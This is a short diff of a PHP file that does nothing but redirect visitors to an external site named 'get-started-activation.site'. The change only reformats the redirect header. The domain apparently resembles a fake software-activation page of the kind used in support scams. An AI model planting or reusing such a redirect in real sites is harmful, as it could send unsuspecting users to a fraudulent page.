@@ -1,4 +1,4 @@
 <?php
-header("Location:http://get-started-activation.site/actmca/");
+header("Location: http://get-started-activation.site/actmca/");
 die();
 ?>
